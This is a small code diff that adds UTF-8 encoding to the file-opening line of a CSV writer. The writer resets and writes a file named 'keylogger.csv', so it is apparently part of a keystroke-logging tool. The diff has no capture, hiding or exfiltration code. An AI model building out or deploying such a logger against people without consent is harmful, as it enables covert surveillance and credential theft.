@@ -44,7 +44,7 @@ class CsvWriter:
         try:
             if os.path.isfile(os.path.dirname(os.path.realpath(__file__)) + "/keylogger.csv"):
                 os.remove(os.path.dirname(os.path.realpath(__file__)) + "/keylogger.csv")
-            self.__csv_file = open(os.path.dirname(os.path.realpath(__file__)) + "/keylogger.csv", "a+", newline="")
+            self.__csv_file = open(os.path.dirname(os.path.realpath(__file__)) + "/keylogger.csv", "a+", newline="", encoding="utf-8")
         except Exception:
             raise Exception("Can't open keylogger-file.")
 
